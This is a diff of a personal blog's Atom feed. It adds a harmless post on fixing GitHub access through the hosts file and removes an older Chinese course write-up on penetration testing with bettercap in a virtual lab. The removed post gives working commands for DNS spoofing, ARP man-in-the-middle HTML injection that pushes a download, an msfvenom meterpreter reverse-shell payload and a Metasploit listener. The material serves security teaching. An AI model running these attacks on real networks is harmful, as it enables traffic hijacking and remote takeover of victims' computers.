@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://fansblog.club/"/>
-  <updated>2020-01-19T09:37:17.678Z</updated>
+  <updated>2020-02-03T16:31:07.145Z</updated>
   <id>https://fansblog.club/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Solve无法访问github的问题</title>
+    <link href="https://fansblog.club/2020/02/04/unable-access-github/"/>
+    <id>https://fansblog.club/2020/02/04/unable-access-github/</id>
+    <published>2020-02-03T16:16:58.000Z</published>
+    <updated>2020-02-03T16:31:07.145Z</updated>
+    
+    <content type="html"><![CDATA[<p>前几天发现家里的网络访问不了github了，开始没太在意，因为挂着代理也能访问不影响，直到今天准备push的时候发现根本push不上去。现将解决方法整理如下。<a id="more"></a></p><h3 id="一、访问github-IP查询网址"><a href="#一、访问github-IP查询网址" class="headerlink" title="一、访问github IP查询网址"></a>一、访问github IP查询网址</h3><p><a href="http://www.github.com.ipaddress.com/" target="_blank" rel="noopener">Click Here</a><br>你会看到如下界面<br><img src="/2020/02/04/unable-access-github/1.jpg" alt="1.jpg"></p><h3 id="修改Hosts文件"><a href="#修改Hosts文件" class="headerlink" title="修改Hosts文件"></a>修改Hosts文件</h3><ul><li><p>Mac<br>位置：<code>/etc/hosts</code></p></li><li><p>Win<br>位置：<code>C:\Windows\system32\drivers\etc</code></p></li></ul><p>添加在IP查询页面看到的IP地址：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.30.253.113github.com</span><br></pre></td></tr></table></figure></p><h3 id="刷新DNS缓存"><a href="#刷新DNS缓存" class="headerlink" title="刷新DNS缓存"></a>刷新DNS缓存</h3><ul><li><p>Mac<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dscacheutil -flushcache</span><br></pre></td></tr></table></figure></p></li><li><p>Win<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/flushdns</span><br></pre></td></tr></table></figure></p></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;前几天发现家里的网络访问不了github了，开始没太在意，因为挂着代理也能访问不影响，直到今天准备push的时候发现根本push不上去。现将解决方法整理如下。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>LeetCode DAY 7 (11-12)</title>
@@ -406,27 +427,6 @@
     <summary type="html">
     
       &lt;p&gt;软件综合训练第二天….&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="软件综合训练课程" scheme="https://fansblog.club/categories/%E8%BD%AF%E4%BB%B6%E7%BB%BC%E5%90%88%E8%AE%AD%E7%BB%83%E8%AF%BE%E7%A8%8B/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>使用bettercap进行渗透测试</title>
-    <link href="https://fansblog.club/2019/09/10/hacker-1/"/>
-    <id>https://fansblog.club/2019/09/10/hacker-1/</id>
-    <published>2019-09-10T15:02:45.000Z</published>
-    <updated>2019-11-15T08:16:04.585Z</updated>
-    
-    <content type="html"><![CDATA[<p>软件综合训练—信息安全方向课程总结<a id="more"></a></p><p>（以下所有在虚拟机kali_linux下实现）</p><h3 id="一、bettercap是什么"><a href="#一、bettercap是什么" class="headerlink" title="一、bettercap是什么"></a>一、bettercap是什么</h3><p>bettercap是一款完整，模块化，轻量级，易扩展的中间人攻击测试工具和框架。</p><p><strong>如何安装？</strong></p><h4 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1. 安装依赖"></a>1. 安装依赖</h4><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby-dev libpcap-dev</span><br></pre></td></tr></table></figure></p><h4 id="2-安装稳定版本（GEM）"><a href="#2-安装稳定版本（GEM）" class="headerlink" title="2. 安装稳定版本（GEM）"></a>2. 安装稳定版本（GEM）</h4><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install bettercap</span><br></pre></td></tr></table></figure></p><p>至此，bettercap已成功安装，下面让我们开始吧！</p><h3 id="二、DNS欺骗"><a href="#二、DNS欺骗" class="headerlink" title="二、DNS欺骗"></a>二、DNS欺骗</h3><p>创建一个dns.conf文件，下面这个dns语句的意思是：所有的以<code>.com</code>结尾的网站全部解析到我的本地http服务器，<code>.*.com</code>就是一个正则，也可以是自定义的正则。</p><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.1.1.1 .*.com</span><br></pre></td></tr></table></figure></p><p>之后使用bettercap命令进行DNS欺骗：</p><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bettercap -X -I eth0 -T 192.168.73.129 -G 192.168.73.2 --dns dns.conf</span><br></pre></td></tr></table></figure></p><p>第一个ip地址为局域网内要攻击的主机ip地址，-G参数为网关。</p><p>为什么一定是局域网内的呢，因为我们利用的是ARP报文的广播原理，而ARP报文只能在同一网段内广播，因此我们需要将kali_linux与受攻击的win7在同一网段下，由于我是用VMwa re开了这两个虚拟机，都是利用nat链接，当然属于同一个网段啦！</p><p><img src="/2019/09/10/hacker-1/dns.png" alt="dns"></p><p>之后被攻击的win7主机会出现什么现象呢？</p><p><img src="/2019/09/10/hacker-1/win7_1.png" alt="win7_1"></p><p>可以看到，ping百度的域名却返回的是我们在dns.conf中写入的1.1.1.1</p><h3 id="三、ARP欺骗-msf"><a href="#三、ARP欺骗-msf" class="headerlink" title="三、ARP欺骗+msf"></a>三、ARP欺骗+msf</h3><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统签名开发。</p><p><strong>进行html注入中间人攻击</strong></p><h4 id="1-生成后门"><a href="#1-生成后门" class="headerlink" title="1. 生成后门"></a>1. 生成后门</h4><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.73.128 LPORT=444 -f exe &gt; run.exe</span><br></pre></td></tr></table></figure></p><p>LHOST为监听主机ip，即攻击者ip。生成一个run.exe文件。</p><p><img src="/2019/09/10/hacker-1/runexe.png" alt="runexe"></p><h4 id="2-启动本地http服务"><a href="#2-启动本地http服务" class="headerlink" title="2. 启动本地http服务"></a>2. 启动本地http服务</h4><p>首先使用screen创建后台：</p><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S test1</span><br></pre></td></tr></table></figure></p><p>​    之后输入：</p><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure></p><p><img src="/2019/09/10/hacker-1/test1.png" alt="test1"></p><p>按ctrl+a+d返回。</p><h4 id="3-启动注入中间人攻击"><a href="#3-启动注入中间人攻击" class="headerlink" title="3. 启动注入中间人攻击"></a>3. 启动注入中间人攻击</h4><p>同样的，我们先使用screen创建一个新后台test2</p><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bettercap -I eth0 -X  -T 192.168.73.129  -G 192.168.73.2  --proxy-module=injecthtml --html-data <span class="hljs-string">"&lt;script&gt;document.body.onclick = function()&#123;window.open('http://192.168.73.128:8888/run.exe')&#125; &lt;/script&gt;"</span></span><br></pre></td></tr></table></figure></p><p><img src="/2019/09/10/hacker-1/test2.png" alt="test2"><br>按ctrl+a+d返回</p><h4 id="4-在本地启动监听"><a href="#4-在本地启动监听" class="headerlink" title="4. 在本地启动监听"></a>4. 在本地启动监听</h4><p>与前面一样，创建新后台test3。</p><p>之后输入命令如下所示：</p><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; </span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="hljs-built_in">set</span> lhost 192.168.73.128</span><br><span class="line"><span class="hljs-built_in">set</span> lport 444</span><br><span class="line">run -j</span><br></pre></td></tr></table></figure></p><p><img src="/2019/09/10/hacker-1/test3.png" alt="test3"></p><h4 id="5-在被攻击端运行run-exe"><a href="#5-在被攻击端运行run-exe" class="headerlink" title="5. 在被攻击端运行run.exe"></a>5. 在被攻击端运行run.exe</h4><p>使用被攻击的win7虚拟机随便打开一个网页，比如 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 之后随便点击一个地方，就会触发我们注入html源码中的函数，跳转到我们的攻击主机ip+端口的web服务上并下载run.exe文件，若点击运行，则被攻击主机的控制权我们就可以拿到了。</p><p><img src="/2019/09/10/hacker-1/downrunexe.png" alt="download"></p><h4 id="6-获得被攻击主机的控制权"><a href="#6-获得被攻击主机的控制权" class="headerlink" title="6. 获得被攻击主机的控制权"></a>6. 获得被攻击主机的控制权</h4><p>在我们的监听会话中我们输入<code>sessions</code>命令可以看到如下内容：</p><p><img src="/2019/09/10/hacker-1/sessions.png" alt="sessions"></p><p>​    我们可以看到id为1的主机便是我们攻击的主机，那么接下来怎么获取它的控制权呢，很简单，我们只要输入：</p><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions 1</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure></p><p><code>meterpreter &gt;</code>为输入<code>sessions 1</code>之后的提示符不需要输入。</p><p>​    接下来我们便可以看到如下内容：</p><p><img src="/2019/09/10/hacker-1/end.png" alt="end"></p><p>这个界面是不是很熟悉呢，嘿嘿嘿</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;软件综合训练—信息安全方向课程总结&lt;/p&gt;
     
     </summary>
     
